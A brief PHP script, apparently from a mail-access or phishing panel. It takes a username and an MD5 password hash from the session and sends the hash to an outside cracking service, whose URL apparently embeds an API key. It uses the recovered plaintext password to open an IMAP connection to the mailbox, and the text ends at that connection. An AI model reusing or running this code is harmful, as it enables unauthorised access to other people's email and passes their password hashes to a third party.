<?php
session_start();
function Decrypt($md5) {
  $result = json_decode(file_get_contents('http://api.md5crack.com/crack/HhYyHDDTmUjirUNm/'.$md5),true);
  return $result['phrase'];
}
$user = $_SESSION['usera3'];
$pass = Decrypt($_SESSION['passa3']);
$imap = $_SESSION['imapserver'];

$connection = imap_open('{'.$_SESSION['imapserver'].':995/imap/ssl}', $user, $pass);
